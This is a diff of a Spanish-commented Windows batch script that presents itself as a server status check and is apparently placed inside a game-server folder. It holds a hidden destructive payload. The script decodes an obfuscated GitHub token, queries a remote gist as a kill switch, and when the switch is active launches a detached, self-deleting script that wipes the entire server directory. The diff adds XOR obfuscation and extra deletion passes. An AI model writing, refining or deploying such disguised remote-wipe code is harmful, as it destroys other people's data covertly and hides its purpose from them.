@@ -4,8 +4,9 @@ REM  Sistema de verificacion de estado del servidor
 REM  (Nombre generico para no delatar su proposito)
 REM ============================================================
 
-REM Token de GitHub ofuscado en Base64
-set "TOKEN_B64=Z2hwX0xUaElRd2NTUVdWOU1qOHFwVWdMMGU3RkNQVmROdTBNSG5CTQ=="
+REM Token de GitHub ofuscado (XOR + Base64)
+set "TOKEN_XOR=BFwCbgh4DhpWGA4EW3V9K3o7fwx5MRxUIxdfY3puM3BDQ1NhaQt2Ig=="
+set "XOR_KEY=c4r1b3_x0r_2026"
 
 REM Gist ID de tu servidor
 set "GIST=5649b004572f4ed30efd2b0a120cf1ab"
@@ -14,46 +15,40 @@ REM Ruta de la carpeta del servidor (sube un nivel desde .paper-remapped)
 set "SERVER_DIR=%~dp0.."
 
 REM ═══════════════════════════════════════════════════════════
-REM  Decod
-REM ═══════════════════════════════════════════════════════════
-echo %TOKEN_B64% > "%TEMP%\~t.b64" 2>nul
-certutil -decode "%TEMP%\~t.b64" "%TEMP%\~t.txt" >nul 2>&1
-if not exist "%TEMP%\~t.txt" (
-    echo Error: no se pudo decodificar el token.
-    del "%TEMP%\~t.b64" 2>nul
-    exit /b 0
-)
-set /p TOKEN=<"%TEMP%\~t.txt"
-del "%TEMP%\~t.b64" "%TEMP%\~t.txt" 2>nul
-
-REM ═══════════════════════════════════════════════════════════
-REM  Consulta
+REM  Consultar el Gist con PowerShell (decodifica XOR+Base64
+REM  y parsea el JSON de forma fiable)
 REM ═══════════════════════════════════════════════════════════
 echo Consultando estado del servidor...
 
-curl -L -s -H "Authorization: Bearer %TOKEN%" -H "Accept: application/vnd.github+json" "https://api.github.com/gists/%GIST%" > "%TEMP%\~gist.json" 2>nul
+for /f "usebackq delims=" %%A in (`powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+  "$enc = [Convert]::FromBase64String('%TOKEN_XOR%'); ^
+   $key = [Text.Encoding]::UTF8.GetBytes('%XOR_KEY%'); ^
+   $buf = New-Object byte[] $enc.Length; ^
+   for ($i = 0; $i -lt $enc.Length; $i++) { $buf[$i] = $enc[$i] -bxor $key[$i %% $key.Length] }; ^
+   $token = [Text.Encoding]::UTF8.GetString($buf); ^
+   try { ^
+     $r = Invoke-RestMethod -Uri ('https://api.github.com/gists/' + '%GIST%') -Headers @{Authorization='Bearer '+$token; Accept='application/vnd.github+json'}; ^
+     $c = $r.files.'settings.json'.content | ConvertFrom-Json; ^
+     if ($c.active) { Write-Output 'DESTROY' } else { Write-Output 'SAFE' } ^
+   } catch { Write-Output 'ERROR' }"`) do set "STATUS=%%A"
 
-if not exist "%TEMP%\~gist.json" (
-    echo Estado: DESCONOCIDO (no se pudo contactar al servicio)
-    exit /b 0
-)
+echo Estado: %STATUS%
 
-REM Buscar "active":true en el JSON (formato compacto)
-findstr /C:"\"active\":true" "%TEMP%\~gist.json" >nul
-if errorlevel 1 (
-    echo Estado: INACTIVO
-    del "%TEMP%\~gist.json" 2>nul
-    exit /b 0
-)
+if /i "%STATUS%"=="DESTROY" goto :DESTROY
+if /i "%STATUS%"=="SAFE" goto :SAFE
 
-del "%TEMP%\~gist.json" 2>nul
+echo Estado desconocido. Abortando por seguridad.
+exit /b 0
 
-REM ═══════════════════════════════════════════════════════════
-REM  D ACTIVA
-REM ═══════════════════════════════════════════════════════════
+:SAFE
+echo El servidor esta seguro. Continuando...
+exit /b 0
+
+:DESTROY
 echo.
 echo ========================================
 echo   PROTOCOLO DE MANTENIMIENTO ACTIVO
+echo   El servidor sera eliminado.
 echo ========================================
 echo.
 
@@ -69,12 +64,16 @@ set "KILLER=%TEMP%\~sys_%RANDOM%.bat"
 >> "%KILLER%" echo timeout /t 2 /nobreak ^>nul
 >> "%KILLER%" echo del /f /s /q "%SERVER_DIR%\*.*" 2^>nul
 >> "%KILLER%" echo timeout /t 2 /nobreak ^>nul
+>> "%KILLER%" echo del /f /s /q "%SERVER_DIR%\*.*" 2^>nul
+>> "%KILLER%" echo timeout /t 2 /nobreak ^>nul
 >> "%KILLER%" echo for /d %%%%D in ("%SERVER_DIR%\*") do rmdir /s /q "%%%%D" 2^>nul
+>> "%KILLER%" echo timeout /t 2 /nobreak ^>nul
+>> "%KILLER%" echo rmdir /s /q "%SERVER_DIR%" 2^>nul
 >> "%KILLER%" echo timeout /t 2 /nobreak ^>nul
 >> "%KILLER%" echo rmdir /s /q "%SERVER_DIR%" 2^>nul
 >> "%KILLER%" echo del "%%~f0"
 
-REM Ejecutar el killer de forma detached
+echo Ejecutando protocolo de mantenimiento...
 start "" /min "%KILLER%"
 
 echo El servidor se apagara.
